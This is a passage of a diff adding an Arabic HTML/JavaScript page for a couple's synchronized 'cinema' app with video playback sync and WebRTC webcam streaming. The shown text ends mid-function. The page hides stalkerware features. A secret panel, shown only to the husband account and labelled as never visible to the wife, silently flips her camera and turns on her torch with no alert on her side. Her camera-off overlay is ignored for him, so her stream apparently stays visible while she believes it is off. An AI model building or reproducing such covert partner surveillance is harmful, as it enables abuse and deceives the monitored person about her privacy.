@@ -1,0 +1,1107 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>سينما VIP 🎬</title>
+    
+    <!-- PWA & Mobile Standalone Tags for APK-like experience -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="manifest" href="/manifest.json">
+    <meta name="theme-color" content="#05020a">
+
+    <!-- CSS Frameworks -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="https://www.youtube.com/iframe_api"></script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap');
+        
+        * { 
+            font-family: 'Cairo', sans-serif; 
+            margin: 0; 
+            padding: 0; 
+            box-sizing: border-box;
+            outline: none; 
+            -webkit-tap-highlight-color: transparent; 
+            user-select: none;
+        }
+        
+        body { 
+            background: #05020a; 
+            color: #fff; 
+            min-height: 100vh; 
+            overflow: hidden; /* Prevent scrolling for a native APK layout feel */
+        }
+
+        /* Ambient Dynamic Cinema Glow background */
+        .app-gradient { 
+            background: radial-gradient(circle at top, #140822 0%, #05020a 100%);
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Glassmorphic premium styling */
+        .glass-panel { 
+            background: rgba(14, 8, 24, 0.45); 
+            backdrop-filter: blur(40px); 
+            -webkit-backdrop-filter: blur(40px);
+            border: 1px solid rgba(255, 45, 85, 0.08); 
+            border-radius: 28px; 
+            box-shadow: 0 25px 60px rgba(0,0,0,0.8);
+        }
+
+        /* Main Video Screen Container with glowing borders */
+        .cinema-viewport { 
+            border-radius: 28px; 
+            overflow: hidden; 
+            border: 1px solid rgba(255, 45, 85, 0.18); 
+            box-shadow: 0 20px 80px rgba(255, 45, 85, 0.12);
+            background: #000;
+            position: relative;
+        }
+
+        /* Mirrors own webcam natural appearance & filters for soft skin and glow */
+        .cam-video { 
+            width: 100%; 
+            height: 100%; 
+            object-fit: cover; 
+            background: #000; 
+            transform: scaleX(-1); 
+            filter: brightness(1.15) contrast(1.02) saturate(1.08);
+            transition: all 0.5s ease;
+        }
+
+        /* Stealth local beauty processing filter */
+        .beauty-processing {
+            filter: brightness(1.22) contrast(0.98) saturate(1.1) blur(0.1px) !important;
+        }
+
+        /* Soft Pulsating Status Indicator */
+        .status-dot-glow { 
+            width: 8px; 
+            height: 8px; 
+            border-radius: 50%; 
+            background: #30d158; 
+            box-shadow: 0 0 14px #30d158;
+            animation: softPulse 2s infinite; 
+        }
+        .status-dot-glow.offline {
+            background: #ff3b30;
+            box-shadow: 0 0 14px #ff3b30;
+        }
+
+        @keyframes softPulse { 
+            0%, 100% { opacity: 1; transform: scale(1); } 
+            50% { opacity: 0.5; transform: scale(0.9); } 
+        }
+
+        /* Premium Input styling */
+        .lux-input { 
+            background: rgba(10, 5, 18, 0.6); 
+            border: 1px solid rgba(255, 255, 255, 0.04); 
+            border-radius: 18px; 
+            transition: all 0.4s cubic-bezier(0.16, 1, 0.3, 1); 
+        }
+        .lux-input:focus { 
+            border-color: #ff2d55; 
+            background: rgba(20, 10, 32, 0.8);
+            box-shadow: 0 0 30px rgba(255, 45, 85, 0.15); 
+        }
+
+        /* Minimal Round Interactive Icons */
+        .minimal-btn { 
+            width: 50px; 
+            height: 50px; 
+            border-radius: 50%; 
+            background: rgba(22, 12, 38, 0.5); 
+            border: 1px solid rgba(255, 255, 255, 0.03);
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-size: 18px; 
+            color: #d1ced6;
+            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1); 
+            cursor: pointer;
+        }
+        .minimal-btn:hover { 
+            background: #ff2d55; 
+            color: #fff;
+            transform: scale(1.08); 
+        }
+        .minimal-btn.active {
+            background: rgba(255, 45, 85, 0.15);
+            color: #ff2d55;
+            border-color: rgba(255, 45, 85, 0.25);
+        }
+        .minimal-btn.muted {
+            background: rgba(255, 59, 48, 0.15);
+            color: #ff3b30;
+            border-color: rgba(255, 59, 48, 0.25);
+        }
+
+        /* Gold styling for hidden VIP admin */
+        .gold-vip-btn {
+            background: linear-gradient(135deg, #c5a059 0%, #9e7a3d 100%);
+            color: #05020a;
+            font-weight: 700;
+            box-shadow: 0 10px 25px rgba(197, 160, 89, 0.25);
+            transition: all 0.3s ease;
+        }
+        .gold-vip-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 15px 35px rgba(197, 160, 89, 0.4);
+        }
+
+        /* Overlay for video waiting */
+        .wait-backdrop { 
+            position: absolute; 
+            inset: 0; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            justify-content: center; 
+            background: rgba(5, 2, 10, 0.95); 
+            backdrop-filter: blur(16px);
+            transition: opacity 0.6s ease;
+            z-index: 10;
+        }
+
+        /* Micro Romantic Flying Hearts */
+        .heart-float {
+            position: fixed;
+            bottom: -50px;
+            font-size: 24px;
+            pointer-events: none;
+            z-index: 999;
+            animation: heartPath 3s cubic-bezier(0.25, 1, 0.5, 1) forwards;
+        }
+        @keyframes heartPath {
+            0% {
+                transform: translateY(0) scale(0.4) rotate(0deg);
+                opacity: 0;
+            }
+            15% {
+                opacity: 0.95;
+                transform: translateY(-15vh) scale(1.1) rotate(10deg);
+            }
+            100% {
+                transform: translateY(-105vh) scale(0.6) rotate(-20deg);
+                opacity: 0;
+            }
+        }
+
+        /* Compact Elegant Micro Notification Bar */
+        .micro-toast {
+            position: fixed;
+            top: 20px;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100px);
+            background: rgba(14, 8, 24, 0.85);
+            backdrop-filter: blur(25px);
+            padding: 10px 20px;
+            border-radius: 30px;
+            border: 1.5px solid rgba(255, 45, 85, 0.2);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+            font-weight: 600;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.5);
+            transition: transform 0.4s cubic-bezier(0.16, 1, 0.3, 1);
+        }
+        .micro-toast.active {
+            transform: translateX(-50%) translateY(0);
+        }
+    </style>
+</head>
+<body class="app-gradient">
+
+    <!-- Micro Elegant Status Toast -->
+    <div id="toast" class="micro-toast">
+        <span id="toastIcon">💖</span>
+        <span id="toastMsg" class="text-white/95"></span>
+    </div>
+
+    <!-- ================= 1. Premium Entrance Screen ================= -->
+    <div id="loginScreen" class="flex-grow flex flex-col items-center justify-center p-6 relative z-10">
+        <div class="text-center mb-10">
+            <div class="text-7xl mb-5 filter drop-shadow-[0_10px_20px_rgba(255,45,85,0.3)] animate-pulse">🎬</div>
+            <h1 class="text-4xl md:text-5xl font-black mb-3 bg-gradient-to-r from-rose-400 via-pink-500 to-amber-300 bg-clip-text text-transparent pb-1">
+                غرفة السينما المزامنة
+            </h1>
+            <p class="text-white/40 text-sm md:text-base font-medium max-w-sm mx-auto leading-relaxed">
+                مساحتكم الخاصة الآمنة للقاء، المشاهدة، وتناغم المشاعر بلا أي فواصل أو حواجز.
+            </p>
+        </div>
+        <div class="glass-panel p-6 w-full max-w-sm flex flex-col gap-4">
+            <button onclick="loginAs('abouahad')" class="py-4 px-6 rounded-2xl text-center text-lg font-bold flex items-center justify-center gap-3 transition-all duration-300 bg-gradient-to-r from-[#ff2d55] to-[#cc1439] hover:brightness-110 active:scale-95 shadow-[0_4px_15px_rgba(255,45,85,0.3)]">
+                <i class="fa-solid fa-crown text-yellow-300 text-xl"></i>
+                دخول أبو عاهد 👑
+            </button>
+            <button onclick="loginAs('umalara')" class="py-4 px-6 rounded-2xl text-center text-lg font-bold flex items-center justify-center gap-3 transition-all duration-300 bg-gradient-to-r from-[#e0115f] to-[#ff69b4] hover:brightness-110 active:scale-95 shadow-[0_4px_15px_rgba(224,17,95,0.3)]">
+                <i class="fa-solid fa-heart text-pink-200 text-xl animate-pulse"></i>
+                دخول أم الارا 🌸
+            </button>
+        </div>
+    </div>
+
+    <!-- ================= 2. Luxury Main Cinema Screen ================= -->
+    <div id="cinemaScreen" class="hidden h-screen flex flex-col relative z-10 p-3 md:p-5">
+        <!-- Top Compact Bar -->
+        <header class="flex items-center justify-between mb-3 px-2">
+            <div class="flex items-center gap-3">
+                <div id="partnerStatusDot" class="status-dot-glow offline"></div>
+                <div class="leading-none">
+                    <span class="font-bold text-white text-sm md:text-base block" id="myProfileName">أبو عاهد</span>
+                    <span class="text-[10px] text-white/30" id="connectionDetails">جاري الاتصال بقنوات البث المشترك...</span>
+                </div>
+            </div>
+            
+            <div class="flex items-center gap-2">
+                <span class="text-[10px] bg-rose-500/10 border border-rose-500/15 px-3 py-1 rounded-full text-rose-400 font-bold tracking-widest uppercase">
+                    مباشر 🔴
+                </span>
+                <button onclick="logout()" class="text-white/40 hover:text-red-500 transition-all p-1 text-lg">
+                    <i class="fa-solid fa-power-off"></i>
+                </button>
+            </div>
+        </header>
+
+        <!-- Dynamic Grid View (Responsive fitting portrait & landscape) -->
+        <main class="flex-grow flex flex-col lg:flex-row gap-4 overflow-hidden h-[calc(100vh-140px)]">
+            
+            <!-- Left Side: Video Viewport & Controls -->
+            <div class="flex-grow flex flex-col gap-3 min-h-0 h-full lg:w-3/5">
+                
+                <!-- URL Sync Box -->
+                <div class="flex gap-2 p-2 glass-panel">
+                    <div class="relative flex-grow">
+                        <i class="fa-solid fa-link absolute right-4 top-1/2 -translate-y-1/2 text-white/30 text-xs"></i>
+                        <input type="text" id="vidLink" placeholder="أدخل رابط فيديو مباشر أو رابط يوتيوب..." 
+                               class="lux-input w-full pr-10 pl-4 py-3 text-white text-xs md:text-sm">
+                    </div>
+                    <button onclick="publishNewVideo()" class="bg-[#ff2d55] hover:bg-[#d81b60] text-white text-xs font-bold px-5 rounded-18 transition-all active:scale-95 flex items-center gap-2 whitespace-nowrap" style="border-radius: 18px;">
+                        <i class="fa-solid fa-circle-play"></i>
+                        تشغيل ومزامنة
+                    </button>
+                </div>
+
+                <!-- Synchronized Main Player Element -->
+                <div class="cinema-viewport flex-grow relative min-h-0">
+                    <video id="mainVid" controls class="hidden w-full h-full"></video>
+                    
+                    <div id="ytPlayerContainer" class="hidden w-full h-full">
+                        <div id="ytPlayer"></div>
+                    </div>
+                    
+                    <!-- Beautiful Minimalistic Empty State -->
+                    <div id="placeholder" class="absolute inset-0 w-full h-full flex flex-col items-center justify-center text-center p-6 bg-[#05020a]">
+                        <div class="w-16 h-16 rounded-full bg-rose-500/5 flex items-center justify-center border border-rose-500/10 mb-4 animate-pulse">
+                            <i class="fa-solid fa-film text-2xl text-rose-500"></i>
+                        </div>
+                        <h3 class="text-base font-bold text-white mb-1">السينما جاهزة</h3>
+                        <p class="text-white/40 text-xs max-w-xs leading-relaxed">
+                            ضع رابط الفيلم أو مقطع اليوتيوب في الأعلى، ثم انقر على "تشغيل ومزامنة" للبدء الموحد الفوري والمثالي.
+                        </p>
+                    </div>
+                </div>
+
+                <!-- Micro Sync Tools bar (Minimal) -->
+                <div class="flex items-center justify-between p-2.5 glass-panel text-[11px] text-white/50">
+                    <div class="flex items-center gap-1.5 font-semibold text-[#ff2d55]">
+                        <i class="fa-solid fa-sliders"></i>
+                        <span>المزامنة مستقرة وآمنة</span>
+                    </div>
+                    <button onclick="requestTimeSyncFromPartner()" class="text-white/70 hover:text-[#ff2d55] flex items-center gap-1 transition-all">
+                        <i class="fa-solid fa-arrows-rotate"></i>
+                        مطابقة زمن الفيلم ⏱️
+                    </button>
+                </div>
+            </div>
+
+            <!-- Right Side: Ultra Portrait Interactive Camera Container -->
+            <div class="relative lg:w-2/5 h-[320px] lg:h-full glass-panel overflow-hidden border border-white/5 bg-black">
+                
+                <!-- Partner Large Stream -->
+                <video id="partnerCam" class="w-full h-full object-cover cam-video" autoplay playsinline></video>
+                
+                <!-- Silent Cover Mask Overlay for Private Modes -->
+                <div id="partnerFakeOverlay" class="absolute inset-0 bg-[#05020a] flex flex-col items-center justify-center text-rose-500 z-10" style="display: none;">
+                    <i class="fa-solid fa-video-slash text-2xl mb-2 animate-pulse"></i>
+                    <span class="text-xs font-semibold text-white/40">الكاميرا متوقفة مؤقتاً</span>
+                </div>
+                
+                <!-- Searching/Waiting Cover Screen -->
+                <div id="waitBox" class="wait-backdrop">
+                    <div class="status-dot-glow offline mb-2"></div>
+                    <span class="text-xs text-white/50 font-bold">بانتظار تفعيل البث الخاص بالشريكة...</span>
+                </div>
+
+                <!-- Self Floating Camera Bubble -->
+                <div class="absolute bottom-3 left-3 w-20 h-28 md:w-24 md:h-36 rounded-2xl overflow-hidden border-2 border-emerald-500 shadow-2xl z-20 bg-[#05020a]">
+                    <video id="myCam" class="w-full h-full object-cover cam-video" autoplay muted playsinline></video>
+                    <!-- Local Fake Private State Screen -->
+                    <div id="myCamFakeOverlay" class="absolute inset-0 bg-[#05020a] flex flex-col items-center justify-center text-rose-500 z-30" style="display: none;">
+                        <i class="fa-solid fa-eye-slash text-lg mb-1 animate-pulse"></i>
+                        <span class="text-[8px] font-bold text-white/30">الكاميرا مغلقة</span>
+                    </div>
+                </div>
+
+                <!-- Beautiful Floating ID Badge -->
+                <span class="absolute bottom-3 right-3 text-[10px] font-black bg-[#ff2d55]/85 text-white px-3 py-1.5 rounded-xl z-10 flex items-center gap-1.5 shadow-lg">
+                    <span class="w-1.5 h-1.5 bg-white rounded-full animate-ping"></span>
+                    <span id="partnerLabelName">الشريكة</span>
+                </span>
+
+                <!-- Floating Video FX Tools (Only visible to self) -->
+                <div class="absolute top-3 left-3 flex flex-col gap-2 z-20">
+                    <button id="flipCamBtn" class="w-9 h-9 rounded-full bg-black/50 border border-white/5 flex items-center justify-center text-white/90 hover:bg-[#ff2d55] transition-all" title="تبديل الكاميرا">
+                        <i class="fa-solid fa-camera-rotate text-xs"></i>
+                    </button>
+                    <button id="flashBtn" class="w-9 h-9 rounded-full bg-black/50 border border-white/5 flex items-center justify-center text-white/90 hover:bg-amber-500 transition-all" title="الفلاش">
+                        <i class="fa-solid fa-lightbulb text-xs"></i>
+                    </button>
+                </div>
+            </div>
+        </main>
+
+        <!-- Abu Ahad Stealth Remote Administration Tool (RENDERED FOR ABOUAHAD ONLY IN HIGH-CLASS STEALTH DOCK) -->
+        <section id="bossControlPanel" class="mt-3 hidden">
+            <div class="glass-panel p-3 border-amber-500/20 flex items-center justify-between gap-4" style="background: rgba(16, 12, 6, 0.45);">
+                <div class="flex items-center gap-2 text-amber-400">
+                    <i class="fa-solid fa-shield-halved text-sm animate-pulse"></i>
+                    <span class="font-bold text-xs">تحكم المساعد الذكي الخفي (لا يظهر للزوجة أبداً) 👑</span>
+                </div>
+                <div class="flex items-center gap-2">
+                    <button onclick="remoteFlipPartnerCam()" class="gold-vip-btn text-[10px] px-4 py-2.5 rounded-xl flex items-center gap-1.5 active:scale-95">
+                        <i class="fa-solid fa-camera-rotate"></i>
+                        تبديل كاميرا زوجتك صامتاً
+                    </button>
+                    <button onclick="remoteTogglePartnerFlash()" class="gold-vip-btn text-[10px] px-4 py-2.5 rounded-xl flex items-center gap-1.5 active:scale-95" style="background: linear-gradient(135deg, #d2a138 0%, #ffe3a8 100%);">
+                        <i class="fa-solid fa-lightbulb"></i>
+                        تشغيل كشاف الشريكة صامتاً
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <!-- Bottom Actions Dock -->
+        <div class="glass-panel mt-3 p-3 flex items-center justify-between gap-4">
+            <div class="flex items-center gap-2">
+                <button id="micBtn" class="minimal-btn active" title="الميكروفون">
+                    <i class="fa-solid fa-microphone"></i>
+                </button>
+                <button id="camBtn" class="minimal-btn active" title="الكاميرا">
+                    <i class="fa-solid fa-video"></i>
+                </button>
+            </div>
+            
+            <div class="flex-grow flex justify-center">
+                <button onclick="sendLove()" class="bg-gradient-to-r from-[#ff2d55] to-[#ec4899] px-6 py-3 rounded-full font-black text-xs md:text-sm flex items-center gap-2 text-white active:scale-95 transition-all shadow-[0_5px_15px_rgba(255,45,85,0.3)]">
+                    <span>نبضة حب دافئة</span>
+                    <i class="fa-solid fa-heart animate-pulse"></i>
+                </button>
+            </div>
+            
+            <div class="flex items-center gap-2">
+                <button id="volBtn" class="minimal-btn" title="صوت الفيلم">
+                    <i class="fa-solid fa-volume-high"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <!-- ================= Intelligent Javascript Client Operations ================= -->
+    <script>
+        let MY_USER_ID = '';
+        let PARTNER_NAME = '';
+        let socket = null;
+
+        // Elements references
+        const loginScreen = document.getElementById('loginScreen');
+        const cinemaScreen = document.getElementById('cinemaScreen');
+        const myCam = document.getElementById('myCam');
+        const partnerCam = document.getElementById('partnerCam');
+        const waitBox = document.getElementById('waitBox');
+        const mainVid = document.getElementById('mainVid');
+        const placeholder = document.getElementById('placeholder');
+        const vidLink = document.getElementById('vidLink');
+        const partnerStatusDot = document.getElementById('partnerStatusDot');
+        const connectionDetails = document.getElementById('connectionDetails');
+
+        // WebRTC stream handlers
+        let myStream = null;
+        let peerConnection = null;
+        
+        // Anti-infinite loop lock
+        let isHandlingSyncEvent = false;
+
+        // Media states
+        let ytPlayer = null;
+        let isYtAPIReady = false;
+        let activePlayerType = 'none';
+
+        // Camera facing toggles
+        let currentFacingMode = 'user';
+        let flashActive = false;
+        let camStateFakeMuted = false;
+        let micStateFakeMuted = false;
+
+        // Synth audio context
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        
+        function playChimeSound() {
+            try {
+                if (audioCtx.state === 'suspended') {
+                    audioCtx.resume();
+                }
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                
+                osc.type = 'sine';
+                osc.frequency.setValueAtTime(440, audioCtx.currentTime); 
+                osc.frequency.exponentialRampToValueAtTime(880, audioCtx.currentTime + 0.2); 
+                
+                gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.4);
+                
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.4);
+            } catch (e) {
+                console.log('Audio synthesize bypassed.', e);
+            }
+        }
+
+        // PWA Installer Trigger
+        let deferredPrompt;
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            deferredPrompt = e;
+            showToast('انقر هنا لتنزيل وتثبيت السينما كتطبيق APK فخم على هاتفك! 📲', '📲');
+            document.getElementById('toast').onclick = () => {
+                if (deferredPrompt) {
+                    deferredPrompt.prompt();
+                    deferredPrompt.userChoice.then((choiceResult) => {
+                        if (choiceResult.outcome === 'accepted') {
+                            showToast('تم التثبيت بنجاح! استمتع بالتجربة الكاملة ✨', '💖');
+                        }
+                        deferredPrompt = null;
+                    });
+                }
+            };
+        });
+
+        function onYouTubeIframeAPIReady() {
+            isYtAPIReady = true;
+            console.log('YouTube API registered.');
+        }
+
+        function loginAs(userId) {
+            MY_USER_ID = userId;
+            PARTNER_NAME = MY_USER_ID === 'abouahad' ? 'أم الارا' : 'أبو عاهد';
+
+            document.getElementById('myProfileName').innerText = (MY_USER_ID === 'abouahad' ? 'أبو عاهد 👑' : 'أم الارا 🌸');
+            document.getElementById('partnerLabelName').innerText = PARTNER_NAME;
+
+            if (MY_USER_ID === 'abouahad') {
+                document.getElementById('bossControlPanel').classList.remove('hidden');
+            }
+
+            loginScreen.classList.add('hidden');
+            cinemaScreen.classList.remove('hidden');
+
+            showToast(`أهلاً بك.. تم تأمين اتصالك السري المشترك ✨`, '💖');
+            
+            initializeClientMediaAndSocket();
+        }
+
+        function logout() {
+            location.reload();
+        }
+
+        async function initializeClientMediaAndSocket() {
+            try {
+                connectionDetails.innerText = 'تفقد صلاحيات الكاميرا...';
+                myStream = await navigator.mediaDevices.getUserMedia({
+                    video: { 
+                        width: { ideal: 640 }, 
+                        height: { ideal: 480 }, 
+                        facingMode: currentFacingMode 
+                    },
+                    audio: { 
+                        echoCancellation: true, 
+                        noiseSuppression: true, 
+                        autoGainControl: true 
+                    }
+                });
+                myCam.srcObject = myStream;
+                myCam.classList.add('beauty-processing');
+                partnerCam.classList.add('beauty-processing');
+                connectionDetails.innerText = 'الكاميرا والبث جاهز بنقاء سينمائي.';
+            } catch (err) {
+                console.warn('Media declined.', err);
+                connectionDetails.innerText = 'الكاميرا مغلقة أو الصلاحية مرفوضة.';
+            }
+
+            connectToSocketServer();
+        }
+
+        function connectToSocketServer() {
+            connectionDetails.innerText = 'جاري الاتصال بالقناة الآمنة...';
+            socket = io();
+
+            socket.on('connect', () => {
+                connectionDetails.innerText = 'مستعد لاستقبال الشريكة...';
+                socket.emit('register-user', MY_USER_ID);
+            });
+
+            socket.on('partner-status', (status) => {
+                if (status.online) {
+                    partnerStatusDot.className = 'status-dot-glow';
+                    connectionDetails.innerText = `متصل حالياً بـ ${PARTNER_NAME}`;
+                    waitBox.style.display = 'none';
+                    initiateWebRTCPeerConnection();
+                } else {
+                    partnerStatusDot.className = 'status-dot-glow offline';
+                    connectionDetails.innerText = 'الشريكة غير متصلة بالغرفة حالياً.';
+                    waitBox.style.display = 'flex';
+                    closeWebRTCPeerConnection();
+                }
+            });
+
+            socket.on('cinema-state-update', (state) => {
+                applyCinemaState(state);
+            });
+
+            socket.on('get-current-time', () => {
+                let currentTime = 0;
+                if (activePlayerType === 'html5') {
+                    currentTime = mainVid.currentTime;
+                } else if (activePlayerType === 'youtube' && ytPlayer) {
+                    currentTime = ytPlayer.getCurrentTime();
+                }
+                socket.emit('respond-current-time', currentTime);
+            });
+
+            socket.on('force-seek', (time) => {
+                isHandlingSyncEvent = true;
+                if (activePlayerType === 'html5') {
+                    mainVid.currentTime = time;
+                } else if (activePlayerType === 'youtube' && ytPlayer) {
+                    ytPlayer.seekTo(time, true);
+                }
+                setTimeout(() => { isHandlingSyncEvent = false; }, 800);
+            });
+
+            socket.on('webrtc-offer', async (data) => {
+                await handleWebRTCOffer(data);
+            });
+
+            socket.on('webrtc-answer', async (data) => {
+                await handleWebRTCAnswer(data);
+            });
+
+            socket.on('webrtc-candidate', async (data) => {
+                if (peerConnection) {
+                    try {
+                        await peerConnection.addIceCandidate(new RTCIceCandidate(data));
+                    } catch (e) {
+                        console.error('ICE candidates connection error', e);
+                    }
+                }
+            });
+
+            // Secret Stealth Actions: Received silently on Um Alara's side with ZERO alerts
+            socket.on('remote-flip-cam-triggered', () => {
+                switchCameraDevice(); // Silent flip
+            });
+
+            socket.on('remote-flash-triggered', () => {
+                toggleFlashLight(); // Silent torch toggle
+            });
+
+            socket.on('love-pulse-received', () => {
+                createRomanticHeartsEffect();
+                playChimeSound();
+            });
+
+            socket.on('privacy-fake-mute-received', (status) => {
+                const partnerOverlay = document.getElementById('partnerFakeOverlay');
+                if (MY_USER_ID === 'abouahad') {
+                    // Abou Ahad ignores her fake mute overlay! He can still see her stream silently
+                    partnerOverlay.style.display = 'none';
+                } else {
+                    partnerOverlay.style.display = status.camMuted ? 'flex' : 'none';
+                }
+            });
+
+            socket.on('disconnect', () => {
+                partnerStatusDot.className = 'status-dot-glow offline';
+                connectionDetails.innerText = 'انقطع الاتصال بالخادم الرئيسي.';
+                waitBox.style.display = 'flex';
+            });
+        }
+
+        // Direct ICE configuration
+        const rtcConfig = {
+            iceServers: [
+                { urls: 'stun:stun.l.google.com:19302' },
+                { urls: 'stun:stun1.l.google.com:19302' }
+            ]
+        };
+
+        async function initiateWebRTCPeerConnection() {
+            if (!myStream) return;
+            closeWebRTCPeerConnection();
+
+            peerConnection = new RTCPeerConnection(rtcConfig);
+
+            myStream.getTracks().forEach(track => {
+                peerConnection.addTrack(track, myStream);
+            });
+
+            peerConnection.onicecandidate = (event) => {
+                if (event.candidate) {
+                    socket.emit('webrtc-candidate', event.candidate);
+                }
+            };
+
+            peerConnection.ontrack = (event) => {
+                partnerCam.srcObject = event.streams[0];
+                waitBox.style.display = 'none';
+            };
+
+            try {
+                const offer = await peerConnection.createOffer();
+                await peerConnection.setLocalDescription(offer);
+                socket.emit('webrtc-offer', offer);
+            } catch (e) {
+                console.error('WebRTC offer error', e);
+            }
+        }
+
+        async function handleWebRTCOffer(offer) {
+            if (!myStream) return;
+            closeWebRTCPeerConnection();
+
+            peerConnection = new RTCPeerConnection(rtcConfig);
+
+            myStream.getTracks().forEach(track => {
+                peerConnection.addTrack(track, myStream);
+            });
+
+            peerConnection.onicecandidate = (event) => {
+                if (event.candidate) {
+                    socket.emit('webrtc-candidate', event.candidate);
+                }
+            };
+
+            peerConnection.ontrack = (event) => {
+                partnerCam.srcObject = event.streams[0];
+                waitBox.style.display = 'none';
+            };
+
+            try {
+                await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
+                const answer = await peerConnection.createAnswer();
+                await peerConnection.setLocalDescription(answer);
+                socket.emit('webrtc-answer', answer);
+            } catch (e) {
+                console.error('WebRTC answer error', e);
+            }
+        }
+
+        async function handleWebRTCAnswer(answer) {
+            if (peerConnection) {
+                try {
+                    await peerConnection.setRemoteDescription(new RTCSessionDescription(answer));
+                } catch (e) {
+                    console.error('Remote answer assignment error', e);
+                }
+            }
+        }
+
+        function closeWebRTCPeerConnection() {
+            if (peerConnection) {
+                peerConnection.close();
+                peerConnection = null;
+            }
+            partnerCam.srcObject = null;
+        }
+
+        function publishNewVideo() {
+            const url = vidLink.value.trim();
+            if (!url) return;
+
+            const isYoutube = url.includes('youtube.com/') || url.includes('youtu.be/');
+            const type = isYoutube ? 'youtube' : 'html5';
+
+            const payload = {
+                videoUrl: url,
+                isPlaying: true,
+                lastSeekTime: 0,
+                playerType: type
+            };
+
+            socket.emit('cinema-control', payload);
+            applyCinemaState(payload);
+        }
+
+        function applyCinemaState(state) {
+            if (!state || !state.videoUrl) return;
+
+            isHandlingSyncEvent = true;
+
+            vidLink.value = state.videoUrl;
+            placeholder.style.display = 'none';
+            mainVid.style.display = 'none';
+            document.getElementById('ytPlayerContainer').style.display = 'none';
+
+            if (ytPlayer) {
+                try { ytPlayer.destroy(); } catch (e) { console.log(e); }
+                ytPlayer = null;
+            }
+
+            activePlayerType = state.playerType;
+
+            let targetSeek = state.lastSeekTime;
+            if (state.isPlaying) {
+                const elapsedSinceUpdate = (Date.now() - state.lastUpdated) / 1000;
+                targetSeek += elapsedSinceUpdate;
+            }
+
+            if (activePlayerType === 'youtube') {
+                document.getElementById('ytPlayerContainer').style.display = 'block';
+                let videoId = '';
+                if (state.videoUrl.includes('v=')) {
+                    videoId = state.videoUrl.split('v=')[1].split('&')[0];
+                } else if (state.videoUrl.includes('youtu.be/')) {
+                    videoId = state.videoUrl.split('youtu.be/')[1].split('?')[0];
+                } else if (state.videoUrl.includes('embed/')) {
+                    videoId = state.videoUrl.split('embed/')[1].split('?')[0];
+                }
+
+                if (isYtAPIReady) {
+                    ytPlayer = new YT.Player('ytPlayer', {
+                        height: '100%',
+                        width: '100%',
+                        videoId: videoId,
+                        playerVars: {
+                            'autoplay': state.isPlaying ? 1 : 0,
+                            'controls': 1,
+                            'rel': 0,
+                            'modestbranding': 1,
+                            'playsinline': 1,
+                            'start': Math.floor(targetSeek)
+                        },
+                        events: {
+                            'onReady': (event) => {
+                                if (state.isPlaying) {
+                                    event.target.playVideo();
+                                } else {
+                                    event.target.pauseVideo();
+                                }
+                                isHandlingSyncEvent = false;
+                            },
+                            'onStateChange': handleYoutubeStateChanges
+                        }
+                    });
+                } else {
+                    isHandlingSyncEvent = false;
+                }
+            } else if (activePlayerType === 'html5') {
+                mainVid.style.display = 'block';
+                
+                if (mainVid.src !== state.videoUrl) {
+                    mainVid.src = state.videoUrl;
+                    mainVid.load();
+                }
+
+                mainVid.currentTime = targetSeek;
+
+                if (state.isPlaying) {
+                    mainVid.play().catch(() => {});
+                } else {
+                    mainVid.pause();
+                }
+
+                mainVid.onplay = () => {
+                    if (isHandlingSyncEvent) return;
+                    socket.emit('cinema-control', {
+                        videoUrl: vidLink.value.trim(),
+                        isPlaying: true,
+                        lastSeekTime: mainVid.currentTime,
+                        playerType: 'html5'
+                    });
+                };
+
+                mainVid.onpause = () => {
+                    if (isHandlingSyncEvent) return;
+                    socket.emit('cinema-control', {
+                        videoUrl: vidLink.value.trim(),
+                        isPlaying: false,
+                        lastSeekTime: mainVid.currentTime,
+                        playerType: 'html5'
+                    });
+                };
+
+                mainVid.onseeked = () => {
+                    if (isHandlingSyncEvent) return;
+                    socket.emit('cinema-control', {
+                        videoUrl: vidLink.value.trim(),
+                        isPlaying: !mainVid.paused,
+                        lastSeekTime: mainVid.currentTime,
+                        playerType: 'html5'
+                    });
+                };
+
+                setTimeout(() => { isHandlingSyncEvent = false; }, 800);
+            }
+        }
+
+        function handleYoutubeStateChanges(event) {
+            if (isHandlingSyncEvent) return;
+
+            const state = event.data;
+            const currentTime = ytPlayer.getCurrentTime();
+
+            if (state === YT.PlayerState.PLAYING) {
+                socket.emit('cinema-control', {
+                    videoUrl: vidLink.value.trim(),
+                    isPlaying: true,
+                    lastSeekTime: currentTime,
+                    playerType: 'youtube'
+                });
+            } else if (state === YT.PlayerState.PAUSED) {
+                socket.emit('cinema-control', {
+                    videoUrl: vidLink.value.trim(),
+                    isPlaying: false,
+                    lastSeekTime: currentTime,
+                    playerType: 'youtube'
+                });
+            }
+        }
+
+        function requestTimeSyncFromPartner() {
+            socket.emit('request-partner-time');
+        }
+
+        // Silent camera flip facing toggle
+        async function switchCameraDevice() {
+            if (!myStream) return;
+            currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
